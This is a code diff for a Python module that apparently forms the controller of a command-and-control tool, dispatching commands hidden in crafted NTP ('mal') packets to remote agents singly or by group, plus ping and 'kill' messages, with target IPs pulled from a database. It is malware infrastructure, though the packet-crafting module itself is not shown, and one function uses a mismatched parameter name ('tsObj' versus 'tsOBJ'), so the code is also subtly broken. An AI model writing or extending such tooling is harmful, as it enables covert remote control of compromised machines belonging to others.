@@ -1,25 +1,40 @@
-from server import convert
 from transport import packets
 
-#send given cmd to API for conversion
-def convertCMD(cmd):
-    return convert.encode(cmd)
+def sendRefCMD(tsObj, destGroup, endpoint, refId):
+    #send manual ping, expect resync back from agent
+    #send refid kill, agent will clean up, status dead in db
+    if destGroup == "agent":
+        print(f"Sending {refId} to {endpoint}")
 
-#receive output and decode, return to TS/(DB)?
-def receiveOutput(output):
-    return convert.decode(output)
+        iPacket = packets.IDPacket(endpoint, refId)
+        iPacket.sendIdPacket()
+
+    else:
+        data = tsOBJ.getDBObj().pullSpecific(destGroup, endpoint)
+        for ip in data:
+            print(f"Sending {refId} to {ip[0]} ({endpoint})")
+
+            iPacket = packets.IDPacket(ip, refId)
+            iPacket.sendIdPacket()
+
 
 #send command via NTP message, craft mal packet
-def sendCMD(tsOBJ, cmd, destGroup, endpoint):
-    if destGroup == "agent":
-        pass #send single command
+def sendCMD(tsOBJ, cmd, destGroup, endpoint): #
+    if destGroup == "agent": 
+        print(f"Sending \"{cmd}\" to ({endpoint})")
+        cPacket = packets.CommandPacket(endpoint, cmd)
+        cPacket.sendCommandPacket()
+
     else:
         data = tsOBJ.getDBObj().pullSpecific(destGroup, endpoint)
         for ip in data:
             print(f"Sending \"{cmd}\" to {ip[0]} ({endpoint})")
-        #send command to selected endpoint agent
-    encoded = convertCMD(cmd)
-    cPacket = packets.CommandPacket()
+
+            cPacket = packets.CommandPacket(ip, cmd)
+            cPacket.sendCommandPacket()
         
+
+def getCMDOutput():
+    pass #command output is passed to this and then "decoded", then printed
 
     #TODO have an initial "ping" setup msg that populates the ip and os fields, add service as descriptor after
